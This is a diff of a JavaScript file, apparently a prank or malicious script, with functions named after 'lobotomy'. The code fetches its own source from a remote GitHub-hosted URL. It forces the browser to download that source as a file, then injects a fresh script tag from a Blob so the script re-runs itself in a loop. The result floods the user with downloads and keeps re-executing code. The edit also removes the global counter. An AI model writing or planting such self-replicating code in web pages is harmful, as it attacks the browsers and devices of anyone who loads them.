@@ -1,25 +1,16 @@
-
-if (typeof window.lobotoCounter !== 'undefined') {
-    var lobotoCounter = window.lobotoCounter;
-} else {
-    var lobotoCounter = 0;
-    window.lobotoCounter = 0;
-}
-
+let lobotoCounter = 0;
 
 async function lobotomy() {
 
     const futureSelf =  lobotoCounter + 1;
-
-   let source;
+    let source;
 
     if (document.currentScript && document.currentScript.dataset.sourceCode) {
-         source = document.currentScript.dataset.sourceCode;
+        source = document.currentScript.dataset.sourceCode;
     } else {
-
         try {
-            const fetched = await fetch(`https://raw.githubusercontent.com/barrettma00-droid/fuckyou_0/refs/heads/main/fuckyou_0.js`);
-             source = await fetched.text();
+            const fetched = await fetch(`https://githubusercontent.com`);
+            source = await fetched.text();
         } catch (e) {
             console.error("Could not fetch base script content.");
             return;
@@ -35,27 +26,24 @@ async function lobotomy() {
         type: "text/javascript",
     });
 
-
     theSecondLobotomy(file, brainSynapses);
 
     return file;
-
 }
 
 async function theSecondLobotomy(capturedFile, brainSynapses) {
 
     const capturedContent = await capturedFile.text();
 
-    console.log(capturedContent)
-    const dowloadedFile = downloadFile(capturedFile);
+    console.log(capturedContent);
+    downloadFile(capturedFile);
     theFinalLobotomy(brainSynapses);
-    console.log(downloadFile)
 
 }
 
 function downloadFile(download) {
 
-    const url = URL.createObjectURL(download)
+    const url = URL.createObjectURL(download);
 
     const link = document.createElement("a");
     link.href = url;
@@ -65,27 +53,20 @@ function downloadFile(download) {
     link.click();
     document.body.removeChild(link);
 
-
-
 }
 
 async function theFinalLobotomy(string) {
-
-    window.lobotoCounter++;
 
     const blob = new Blob([string], { type: 'text/javascript'});
     const blobsPlace = URL.createObjectURL(blob);
 
     const theNeedle = document.createElement('script');
     theNeedle.src = blobsPlace;
-
     theNeedle.dataset.sourceCode = string;
 
     theNeedle.onload = () => {
-
         //Comment this if you want to suffer
         URL.revokeObjectURL(blobsPlace);
-
     };
 
     document.head.appendChild(theNeedle);
@@ -93,7 +74,8 @@ async function theFinalLobotomy(string) {
 }
 
 
-const result =  lobotomy();
-
-console.log(result);
+{
+    const result = lobotomy();
+    console.log("Promise initiated:", result);
+}
 
